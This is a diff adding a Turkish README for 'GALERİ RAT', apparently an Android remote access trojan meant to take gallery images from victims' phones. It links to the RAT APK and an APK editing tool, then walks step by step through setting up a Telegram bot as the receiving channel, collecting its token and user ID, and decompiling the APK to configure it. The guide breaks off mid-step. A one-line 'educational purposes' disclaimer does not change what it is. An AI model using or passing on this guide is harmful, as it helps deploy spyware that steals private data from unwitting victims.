@@ -1,1 +1,45 @@
-# galeri-rat
+<h1>ZUKO BABA SUNARR</h1>
+
+# GALERİ RAT
+
+## GALERİ RAT KURULUM VE KULLANIM AŞAMALARI 
+* DOSYALARI İNDİRME
+* TELEGRAM AYARI
+* UYGULAMA AYARI
+* KULLANIM
+* NOT: ADIM ADIM GİDİN ATMALA YAPMAYIN SONRA HATA YAPTIM DERSİNİZ.
+
+<h6>EĞLENECE VE EĞİTİM AMAÇLIDIR YASADIŞI KULLANIMDA SORUMLULUK KABUL EDİLMEZ</h6>
+
+## RAT ANA UYGULAMASI 
+Arkadaşlar verdiğim linkten indirin sadece apk olarak kalsın telefonda telefona kurmayın ve çalıştırmayın!
+<a href="https://dosya.co/m21a24pudo9h/zuko_online.apk.html" target=_blank>zuko online.apk - 7.0 MB</a>
+
+## ANDROİD DÜZENLEME UYGULAMASI
+Arkadaşlar bunu indirip kurun bunda zararlı yazılım yok.
+<a href="https://dosya.co/xmahxp7xy526/base.apk.html" target=_blank>base.apk - 5.3 MB</a>
+
+## TELEGRAM AYARI 
+* Birinci adım olarak telegramı açıp @BotFather botuna gidiyoruz start diyip başlatıyoruz.
+* Sonra `/newbot` yazıp enter yapıyoruz.
+
+* şimdiki adımda bizden isim isteyecek ismi kendi nickiniz yapabilirsiniz ama garanti olsun diye örnek:`kendinickiniz366` en az 3 rakam koymak işi garantiye alır. ismi yazıp enter yapıyoruz.
+  
+* isim bittiğine göre sıra kullanıcı isminde bunun sonunda `bot` veya `_bot` olmak zorunda örnek:`zuko638_bot` bundada rakam tavsiyemdir. kullanıcı ismini yazıp enter yapıyoruz.
+  
+* sonra bize bir API key ve botumuzu vercek. şimdi aşağıda verdiğim gibi ilk iş tokeni yanı API keyi kopyalayıp saklamak <a href="https://hizliresim.com/iahwkbz"><img src="https://i.hizliresim.com/iahwkbz.jpg" alt="ff"></a>
+işaret içine aldığım şey tokendir yani API key
+
+* şimdi botumuza gidip start verelim yoksa çalışmaz aşağıda verdiğim gibi mavi linke tıklayıp bota gidiniz <a href="https://hizliresim.com/9b6uquj"><img src="https://i.hizliresim.com/9b6uquj.jpg" alt="ff"></a>
+
+* Botun sohpet kısmına geldikten sonra start yapın aşağıda verdiğim gibi <a href="https://hizliresim.com/pfq7nvu"><img src="https://i.hizliresim.com/pfq7nvu.jpg" alt="ff"></a>
+
+* şimdi ıd mizi alacaz @InfousersTgbot bu bota gidip start verin size verdiği kanallara katılıp bota geri dönün ve katıldım butonu göreceksiniz ona basın sonra size ıdnizi verecek şu şekilde <a href="https://hizliresim.com/8dr3vzd"><img src="https://i.hizliresim.com/8dr3vzd.jpg" alt="ff"></a> bunuda kopyalayıp saklayın.
+* telegramdaki işimiz bitti şimdilik
+
+## UYGULAMA AYARI 
+* size verdiğim Android düzenleme uygulamasını açın şu ekranı göreceksiniz <a href="https://hizliresim.com/jwl4npr"><img src="https://i.hizliresim.com/jwl4npr.jpg" alt="ff"></a> işaretledim yere gidin
+* şimdi size ilk verdiğim rat ana uygulama apk sını bulun bulduğunuzda üstüne tıklayın <a href="https://hizliresim.com/jd3rh6v"><img src="https://i.hizliresim.com/jd3rh6v.jpg" alt="ff"></a>
+* şimdi karşınıza gelen ekranda Full edit kısmına basın <a href="https://hizliresim.com/qma910f"><img src="https://i.hizliresim.com/qma910f.jpg" alt="ff"></a>
+* gelen ekrandan decode all files kısmına basın <a href="https://hizliresim.com/er2lq06"><img src="https://i.hizliresim.com/er2lq06.jpg" alt="ff"></a>
+* 
